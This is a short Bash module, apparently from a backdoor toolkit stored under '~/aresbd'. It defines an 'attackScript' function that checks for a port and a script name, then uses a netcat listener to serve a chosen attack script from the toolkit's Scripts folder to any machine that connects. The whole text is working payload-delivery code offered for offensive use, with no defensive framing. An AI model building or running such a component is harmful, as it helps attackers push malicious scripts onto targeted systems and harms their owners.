echo -e "Loading attackScript.abdmodule... \c"
attackScript()
{
	if [[ -z "$PORT" ]]; then
		echo "You need to set the port first!"
	elif [[ -z "$SCRIPT" ]]; then
		echo "You need to set the script first!"
	else
		nc -l -p $PORT < ~/aresbd/Scripts/$SCRIPT
	fi
}
echo "Done."
